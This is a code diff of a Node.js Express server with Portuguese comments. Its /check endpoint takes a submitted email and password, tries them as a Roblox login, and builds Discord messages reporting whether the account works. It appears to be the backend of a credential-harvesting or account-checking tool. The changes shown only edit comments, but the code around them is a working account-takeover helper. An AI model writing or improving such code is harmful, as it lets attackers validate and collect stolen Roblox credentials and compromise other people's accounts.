@@ -1,5 +1,5 @@
 const express = require('express');
-const fetch = require('node-fetch');
+const fetch = require('node-fetch'); // Isto corrige o erro "fetch is not a function"
 const app = express();
 const port = process.env.PORT || 3000;
 
@@ -27,11 +27,9 @@ async function loginRoblox(email, password) {
         });
 
         const data = await response.json();
-        // O Roblox retorna { id: 123, username: "User" } se estiver correto
-        // Se estiver errado, retorna { error: "User not found" } ou similar
         
         return { 
-            success: response.ok && data.id, // Só é sucesso se houver ID
+            success: response.ok && data.id, 
             data: data, 
             error: data.error || null,
             statusCode: response.status
@@ -71,7 +69,6 @@ app.post('/check', async (req, res) => {
     const result = await loginRoblox(email, password);
 
     if (result.success) {
-        // Só entra aqui se o login foi REALMENTE bem-sucedido
         const username = result.data.username || "Unknown";
         const userId = result.data.id || "Unknown";
         
@@ -90,7 +87,6 @@ app.post('/check', async (req, res) => {
             error: ""
         });
     } else {
-        // Se falhou, retorna o erro exato
         const errorMsg = result.error || "Conta ou Senha Incorretas";
         
         const discordMessage = `**❌ LOGIN FALHOU**\n\n` +
